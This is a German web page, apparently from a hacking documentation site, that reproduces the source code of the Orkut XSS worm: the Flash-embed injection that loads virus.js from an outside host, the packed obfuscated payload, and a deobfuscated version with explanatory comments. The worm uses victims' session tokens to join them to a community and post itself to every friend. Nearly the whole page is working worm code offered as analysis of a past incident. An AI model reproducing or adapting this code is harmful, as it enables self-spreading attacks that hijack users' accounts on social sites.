@@ -1,0 +1,315 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+
+<title>You&#8217;ve been hacked! - Der Sourcecode des Orkut-XSS-Wurms</title>
+
+</head>
+
+<body>
+
+<h1>You&#8217;ve been hacked! - Der Sourcecode des Orkut-XSS-Wurms</h1>
+
+<p>
+Zuerst der Quelltext der Flash-Datei. Er stammt aus einem  
+<a href="http://ryanlrussell.blogspot.com/2007/12/orkut-virus.html">Blogeintrag</a>
+von Ryan Russell, die Formatierung ist von mir:
+</p>
+
+
+<pre><code>&lt;div id="flashDiv295378627"&gt;
+  &lt;embed type="application/x-shockwave-flash" src="Scrapbook_files/LoL.html" style="" 
+      id="295378627" name="295378627" bgcolor="#FFFFFF" quality="autohigh" 
+      wmode="transparent" allownetworking="internal" allowscriptaccess="never"
+      height="1" width="1"&gt;
+  &lt;/embed&gt;
+&lt;/div&gt;
+
+&lt;script type="text/javascript"&gt; 
+  var flashWriter = new _SWFObject('http://www.orkut.com/LoL.aspx', '295378627', '1', 
+      '1', '9', '#FFFFFF', 'autohigh', '', '', '295378627');
+   
+  flashWriter._addParam('wmode', 'transparent'); 
+
+  script=document.createElement('script');
+  script.src='http://files.myopera.com/virusdoorkut/files/virus.js';
+  
+  document.getElementsByTagName('head')[0].appendChild(script);
+  escape('');
+  flashWriter._addParam('allowNetworking', 'internal');
+  flashWriter._addParam('allowScriptAccess', 'never');
+  flashWriter._setAttribute('style', '');
+  flashWriter._write('flashDiv295378627');
+&lt;/script&gt;</code></pre>
+
+
+<p>
+Einzige Aufgabe der Flash-Datei war das Nachladen des eigentlichen
+Schadcodes von 
+<code>http://files.myopera.com/virusdoorkut/files/virus.js</code>. 
+Der folgende Quelltext stammt samt Formatierung aus einem
+<a href="https://www.gnucitizen.org/blog/the-orkut-xss-worm/">Blogeintrag</a>
+von Petko D. Petkov ("pdp (architect)").
+</p>
+
+<pre><code>function $(p,a,c,k,e,d) {
+    e=function(c) {
+        return(c&lt;a?"":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))
+    };
+    if(!''.replace(/^/,String)){
+        while(c--){d[e(c)]=k[c]&#166;&#166;e(c)}
+        k=[function(e){return d[e]}];
+        e=function(){return'\\w+'};
+        c=1
+    };
+    while(c--){
+        if(k[c]){
+            p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])
+        }
+    }
+    return p
+};
+setTimeout(
+    $('5 j=0;5 q=1q["2o.H"];5 E=1q["2p.K.27"];7 B(){Z{b i 14("29.1l")}
+    L(e){};Z{b i 14("2b.1l")}L(e){};Z{b i 2l()}L(e){};b J};
+    7 W(g,P,m,c,9,U){5 1m=g+"="+19(P)+(m?"; m="+m.2f():"")+(c?"; c="+c:"")+(9?"; 9="+9:"")+(U?"; U":"");
+    8.y=1m};7 v(g){5 l=8.y;5 A=g+"=";5 h=l.S("; "+A);6(h==-1){h=l.S(A);6(h!=0){b 2h}}16{h+=2};
+    5 u=8.y.S(";",h);6(u==-1){u=l.M};b 2j(l.2m(h+A.M,u))};
+    7 26(g,c,9){6(v(g)){8.y=g+"="+(c?"; c="+c:"")+(9?"; 9="+9:"")+"; m=1u, 1i-1v-1x 1g:1g:1i 1y";1U.1z(0)}};
+    7 G(){5 3=B();6(3){3.R("1A","o://k.w.p/1B.z",C);3.a(J);3.Y=7(){6(3.X==4){6(3.1a==1c){5 1r=3.1Q;5 t=8.1n("t");
+    t.1D=1r;5 f=t.D("f").O(0);6(f){f.1M(f.D("1F").O(0));f.1G("1H","N");f.1J.1K="1L";8.1N.1f(f);V()}}16{G()}}};
+    3.a(J)}};7 T(){5 a="H="+n(q)+"&#038;K="+n(E)+"&#038;15.1O";5 3=B();3.R(\'q\',\'o://k.w.p/1P.z?1R=1S\',C);
+    3.12(\'10-1e\',\'Q/x-k-17-1b\');3.a(a);3.Y=7(){6(3.X==4){6(3.1a!=1c){T();b};G()}}};
+    7 V(){6(j==8.18("N").M){b};
+    5 I="1V 1W 1X... 1Y 1Z 20 21 22 23 24&lt;1k/&gt;[1j]25 "+i F()+"[/1j]&lt;1k/&gt;&lt;13 1o=\\"o://k.w.p/28.z\\" 2a=\\"Q/x-2c-2d\\" 2e=\\"2g\');
+    r=8.1n(\'r\');r.1o=\'o://1p.2k.p/2n/1p/1s.1t\';8.D(\'1w\')[0].1f(r);19(\'\\" 1C=\\"1\\" 1E=\\"1\\"&gt;&lt;/13>&#8220;;
+    5 a=&#8221;15.1I=1&#038;H=&#8221;+n(q)+&#8221;&#038;I=&#8221;+n(I)+&#8221;&#038;K=&#8221;+n(E)+&#8221;&#038;1T=&#8221;+8.18(&#8221;N&#8221;).O(j).P;5 3=B();
+    3.R(&#8221;q&#8221;,&#8221;o://k.w.p/2i.z&#8221;,C);3.12(&#8221;10-1e&#8221;,&#8221;Q/x-k-17-1b;&#8221;);
+    3.a(a);3.Y=7(){6(3.X==4){j++;5 d=i F;d.1d(d.1h()+11);W(\&#8217;s\&#8217;,j,d);V()}}};
+    6(!v(\&#8217;s\&#8217;)){5 d=i F;d.1d(d.1h()+11);W(\&#8217;s\&#8217;,\&#8217;0\&#8217;,d)};j=v(\&#8217;s\&#8217;);T();
+    &#8216;,62,150,&#8217;&#166;&#166;&#166;xml&#166;&#166;var&#166;if&#166;function&#166;document&#166;domain&#166;send&#166;return&#166;path&#166;wDate&#166;&#166;select&#166;name&#166;begin&#166;new&#166;index&#166;
+    www&#166;dc&#166;expires&#166;encodeURIComponent&#166;http&#166;com&#166;POST&#166;script&#166;wormdoorkut&#166;div&#166;end&#166;getCookie&#166;orkut&#166;&#166;cookie&#166;aspx
+    &#166;prefix&#166;createXMLHttpRequest&#166;true&#166;getElementsByTagName&#166;SIG&#166;Date&#166;loadFriends&#166;POST_TOKEN&#166;scrapText&#166;null&#166;
+    signature&#166;catch&#166;length&#166;selectedList&#166;item&#166;value&#166;application&#166;open&#166;indexOf&#166;cmm_join&#166;secure&#166;sendScrap&#166;setCookie&#166;
+    readyState&#166;onreadystatechange&#166;try&#166;Content&#166;86400&#166;setRequestHeader&#166;embed&#166;ActiveXObject&#166;Action&#166;else&#166;form&#166;
+    getElementById&#166;escape&#166;status&#166;urlencoded&#166;200&#166;setTime&#166;Type&#166;appendChild&#166;00&#166;getTime&#166;01&#166;silver&#166;br&#166;XMLHTTP&#166;curCookie&#166;
+    createElement&#166;src&#166;files&#166;JSHDF&#166;xmlr&#166;virus&#166;js&#166;Thu&#166;Jan&#166;head&#166;70&#166;GMT&#166;go&#166;GET&#166;Compose&#166;width&#166;innerHTML&#166;height&#166;option&#166;
+    setAttribute&#166;id&#166;submit&#166;style&#166;display&#166;none&#166;removeChild&#166;body&#166;join&#166;CommunityJoin&#166;responseText&#166;cmm&#166;44001818&#166;toUserId&#166;
+    history&#166;2008&#166;vem&#166;ai&#166;que&#166;ele&#166;comece&#166;mto&#166;bem&#166;para&#166;vc&#166;RL&#166;deleteCookie&#166;raw&#166;LoL&#166;Msxml2&#166;type&#166;Microsoft&#166;shockwave&#166;flash&#166;
+    wmode&#166;toGMTString&#166;transparent&#166;false&#166;Scrapbook&#166;unescape&#166;myopera
+    &#166;XMLHttpRequest&#166;substring&#166;virusdoorkut&#166;CGI&#166;Page&#8217;.split(&#8217;&#166;'),0,{}),1
+);
+author=&#8221;Rodrigo Lacerda&#8221;</code></pre>
+
+<p>
+Der Code wurde mit 
+<a href="http://dean.edwards.name/packer/">Dean Edwards Javascript Packer</a>
+getarnt (obfuscated). Wie man den eigentliche Quelltext zur&uuml;ckerh&auml;lt, wird
+in einem 
+<a href="http://yaisb.blogspot.com/2006/10/defeating-dean-edwards-javascript.html">Blogeintrag</a>
+von Ryan Cartner beschrieben. Das Ergebnis sieht dann so aus (Quelle:
+Dieser
+<a href="https://web.archive.org/web/20080110035703/http://sla.ckers.org/forum/read.php?2,14477,18504#msg-18540">Forumsbeitrag</a>
+auf sla.ckers.org, Formatierung und Kommentare von mir):
+</p>
+
+<pre><code>var index = 0; 
+var POST = JSHDF['CGI.POST_TOKEN']; 
+var SIG = JSHDF['Page.signature.raw']; 
+
+<font color="#0000FF">// Hilfsfunktion zum Erzeugen von XMLHttpRequests</font>
+function createXMLHttpRequest() { 
+  try {
+    return new ActiveXObject("Msxml2.XMLHTTP");
+  } 
+  catch (e) { } 
+  try { 
+    return new ActiveXObject("Microsoft.XMLHTTP"); 
+  }
+  catch (e) { 
+  } 
+  try { 
+    return new XMLHttpRequest; 
+  }
+  catch (e) { 
+  } 
+  return null; 
+} 
+
+
+<font color="#0000FF">// Hilfsfunktion zum Setzen eines Cookies</font>
+function setCookie(name, value, expires, path, domain, secure) { 
+  var curCookie = name + "=" + escape(value) + 
+        (expires ? "; expires=" + expires.toGMTString() : "") + 
+        (path ? "; path=" + path : "") + 
+        (domain ? "; domain=" + domain : "") + 
+        (secure ? "; secure" : ""); 
+  document.cookie = curCookie; 
+} 
+
+
+<font color="#0000FF">// Hilfsfunktion zum Lesen des Cookies</font>
+function getCookie(name) { 
+  var dc = document.cookie; 
+  var prefix = name + "="; 
+  var begin = dc.indexOf("; " + prefix); 
+
+  if (begin == -1) { 
+    begin = dc.indexOf(prefix); 
+    if (begin != 0) { 
+      return false; 
+    } 
+  }
+  else { 
+    begin += 2; 
+  } 
+
+  var end = document.cookie.indexOf(";", begin); 
+  if (end == -1) { 
+    end = dc.length; 
+  } 
+
+  return unescape(dc.substring(begin + prefix.length, end)); 
+} 
+
+
+<font color="#0000FF">// Hilfsfunktion zum L&ouml;schen des Cookies</font>
+function deleteCookie(name, path, domain) { 
+  if (getCookie(name)) { 
+    document.cookie = name + "=" + (path ? "; path=" + path : "") + 
+        (domain ? "; domain=" + domain : "") + 
+        "; expires=Thu, 01-Jan-70 00:00:01 GMT"; 
+    history.go(0); 
+  } 
+} 
+
+
+<font color="#0000FF">// Diese Funktion liest die Liste der Freunde des Opfers
+// und sendet dann den Wurm als Scrap-Nachricht </font>
+function loadFriends() { 
+  var xml = createXMLHttpRequest(); 
+  if (xml) { 
+    xml.open("GET", "http://www.orkut.com/Compose.aspx", true); 
+    xml.send(null); 
+    xml.onreadystatechange = function () {
+          if (xml.readyState == 4) {
+            if (xml.status == 200) {
+              var xmlr = xml.responseText;
+              var div = document.createElement("div");
+              div.innerHTML = xmlr;
+              var select = div.getElementsByTagName("select").item(0);
+              if (select) {
+                select.removeChild(select.getElementsByTagName("option").item(0));
+                select.setAttribute("id", "selectedList");
+                select.style.display = "none";
+                document.body.appendChild(select);
+                sendScrap();
+              }
+            }
+            else {
+              loadFriends();
+            }
+          }
+        }; 
+    xml.send(null); 
+  } 
+} 
+
+
+<font color="#0000FF">// Diese Funktion f&uuml;gt das Opfer zur Gruppe &quot;Infectatos pelo Virus do Orkut&quot; 
+// hinzu und startet dann das Lesen der Freundes-Liste </font>
+function cmm_join() { 
+  var send = "POST_TOKEN=" + encodeURIComponent(POST) + "&amp;signature=" + 
+        encodeURIComponent(SIG) + "&amp;Action.join"; 
+  var xml = createXMLHttpRequest(); 
+  xml.open("POST", "http://www.orkut.com/CommunityJoin.aspx?cmm=" + 
+        String.fromCharCode(52, 52, 48, 48, 49, 56, 49, 56), true); 
+  xml.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
+  xml.send(send); 
+  xml.onreadystatechange = function () {
+          if (xml.readyState == 4) {
+            if (xml.status != 200) {
+              cmm_join();
+              return;
+            }
+          loadFriends();
+          }
+        }; 
+} 
+
+
+<font color="#0000FF">// Diese Funktion sendet den Wurm als Scrap-Nachricht an die Freunde des Opfers </font>
+function sendScrap() { 
+  if (index == document.getElementById("selectedList").length) { 
+    return; 
+  } 
+  var scrapText = "Boas festas de final de ano!&lt;br/&gt;&lt;br/&gt;[silver]" + 
+        (new Date).getTime() + "[/silver]&lt;br/&gt;
+        &lt;embed src=\"http://www.orkut.com/LoL.aspx\" 
+        type=\"application/x-shockwave-flash\" wmode=\"transparent');
+        script=document.createElement('script');
+        script.src='http://files.myopera.com/virusdoorkut/files/virus.js';
+        document.getElementsByTagName('head')[0].appendChild(script);
+        escape('\" width=\"1\" height=\"1\"&gt;&lt;/embed&gt;"; 
+  var send = "Action.submit=1&amp;POST_TOKEN=" + encodeURIComponent(POST) +
+        "&amp;scrapText=" + encodeURIComponent(scrapText) + "&amp;signature=" + 
+        encodeURIComponent(SIG) + "&amp;toUserId=" + 
+        document.getElementById("selectedList").item(index).value; 
+  var xml = createXMLHttpRequest(); 
+  xml.open("POST", "http://www.orkut.com/Scrapbook.aspx", true); 
+  xml.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;"); 
+  xml.send(send); 
+  xml.onreadystatechange = function () {
+          if (xml.readyState == 4) {
+            index++;
+            var wDate = new Date;
+            wDate.setTime(wDate.getTime() + 86400);
+            setCookie("wormdoorkut", index, wDate);
+            <font color="#0000FF">// Im Cookie 'wormdoorkut' wird der aktuelle
+            // Index der Freundes-Liste gespeichert </font>
+            sendScrap();
+          }
+        }; 
+} 
+
+<font color="#0000FF">// Der Wurm verwendet den Cookie 'wormdoorkut', um den aktuellen Index der
+// Freundes-Liste zu speichern. Das erlaubt es ihm auch, festzustellen, ob
+// das Opfer bereits zur Gruppe hinzugef&uuml;gt wurde.
+// Ist das der Fall, muss nur noch der Wurm an die Freunde des Opfers
+// gesendet werden, an die er bisher nicht gesendet wurde </font>
+if (!getCookie("wormdoorkut")) { 
+  <font color="#0000FF">// Der Cookie ist noch nicht vorhanden, also muss er angelegt werden</font>
+  var wDate = new Date; 
+  wDate.setTime(wDate.getTime() + 86400); 
+  setCookie("wormdoorkut", "0", wDate); 
+} 
+
+index = getCookie("wormdoorkut"); 
+
+if (getCookie("wormdoorkut") == "0") { 
+  <font color="#0000FF">// Der Cookie hat den Wert 0, das Opfer wurde noch nicht zur Gruppe hinzugef&uuml;gt </font>
+  cmm_join(); 
+}
+else { 
+  <font color="#0000FF">// Das Opfer wurde bereits zur Gruppe hinzugef&uuml;gt, also muss nur noch der Wurm
+  // versendet werden </font>
+  loadFriends(); 
+}</code></pre>
+
+<hr>
+
+<p>
+Zur&uuml;ck
+<a href="orkut.html">zur Wurm-Beschreibung</a>
+oder
+<a href="../kapitel5.html">zur Kapitel-Startseite</a>
+oder
+<a href="../../hacking-index.html">zur Doku-Startseite</a>
+</p>
+
+
+
+
+</body>
+
+</html>
